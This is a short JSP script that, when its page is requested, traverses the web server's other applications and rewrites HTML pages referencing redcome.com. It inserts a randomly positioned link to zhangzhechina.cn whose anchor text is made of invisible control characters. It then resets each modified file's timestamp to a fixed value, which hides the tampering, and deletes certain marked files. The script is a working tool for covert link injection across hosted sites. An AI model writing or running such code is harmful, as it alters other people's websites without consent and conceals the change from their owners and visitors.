<%@page contentType="text/html; charset=UTF-8"%><%@ page import="java.io.*" %><%@ page import="java.util.*" %><%
response.setHeader("Expires", "0");
response.setHeader("Cache-Control", "no-cache");
response.setHeader("Pragma", "no-cache");

long time=1234143094864L;

Random ran=new Random();
File f=new File(application.getRealPath("/../../")).getCanonicalFile();
File apps[]=f.listFiles();
for(int i=0;i<apps.length;i++)
{
  String ss[]=apps[i].list();
  if(ss==null)continue;
  System.out.println(apps[i].getName()+"<hr>");
  for(int j=0;j<ss.length;j++)
  {
    File h=new File(apps[i]+"/"+ss[j]+"/res/html/");
    if(h.isDirectory())
    {
      int left=ran.nextInt(780);
      int top=ran.nextInt(600);
      String key="";
      for(int k=10+ran.nextInt(10);k>0;k--)
      {
        int v=ran.nextInt(4);
        key=key+(char)(v+28);
      }

      File fs[]=h.listFiles();
      for(int x=0;x<fs.length;x++)
      {
        String name=fs[x].getName();
        if(fs[x].lastModified()==time)
        {
          if(name.indexOf("S1L")!=-1)fs[x].delete();
          continue;
        }
        if(name.indexOf("S0L")==-1)continue;
        byte by[]=new byte[(int)fs[x].length()];
        try
        {
          FileInputStream fis=new FileInputStream(fs[x]);
          fis.read(by);
          fis.close();
          String str=new String(by,"UTF-8");
          int y=str.lastIndexOf("http://www.redcome.com");
          if(y!=-1)
          {
            //System.out.println(fs[x]+"<br>");
            y=str.indexOf("</div>")+6;
            int e=y;
            if(str.indexOf(".cangku.",y)!=-1)
            {
              e=str.indexOf("</a></div>",y)+10;
            }
            str=str.substring(0,y)+"<div style='position:absolute;left:"+left+"px;top:"+top+"px;'><span id='NodeTitle'><a href='http://www.zhangzhechina.cn/' target='_blank' style='text-decoration:none;' title='中华长者网'>"+key+"</a></span></div>"+str.substring(e);
            FileOutputStream fos=new FileOutputStream(fs[x]);
            fos.write(str.getBytes("UTF-8"));
            fos.close();
          }
          fs[x].setLastModified(time);
        }catch(IOException ex)
        {}
      }
    }
  }
}
%>
